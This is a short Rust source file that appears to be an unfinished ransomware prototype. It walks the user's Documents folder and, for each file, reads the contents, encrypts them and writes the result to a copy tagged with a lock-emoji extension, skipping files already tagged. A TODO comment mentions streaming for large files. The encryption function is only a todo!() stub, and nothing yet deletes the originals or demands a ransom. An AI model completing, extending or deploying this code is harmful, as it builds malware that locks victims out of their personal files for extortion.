use dirs::home_dir;
use std::fs;
use std::path::PathBuf;
use anyhow::Result;

const ENCRYPTED_EXTENSION:	&str	= ".🔒";

// TODO: use streams
// current code isn't capable of encrypting giant files due
// to having to load the whole file into memory

fn main() -> Result<()> {
	let target_dir = format!(
		"{}\\Documents",
		home_dir().unwrap_or("~".into()).to_string_lossy(),
	);

	let entries = fs::read_dir(target_dir)?;
	for entry in entries {
		let path = entry?.path();

		if path.is_file() {
			encrypt_file(path)?;
		}
	}

	Ok(())
}

fn encrypt_file(path: PathBuf) -> Result<()> {
	let file_name = path.file_name().unwrap().to_string_lossy();

	if !file_name.ends_with(ENCRYPTED_EXTENSION) {
		let encrypted_path = PathBuf::from(
			format!("{}{}", path.display(), ENCRYPTED_EXTENSION)
		);

		// Prepare new file data
		let content = fs::read(&path)?;
		let encrypted_data = encrypt_xchacha20(content);

		// Write encrypted data to new file
		fs::write(&encrypted_path, &encrypted_data[..])?;
	}

	Ok(())
}

fn encrypt_xchacha20(_src: Vec<u8>) -> Vec<u8> {
	todo!()
}
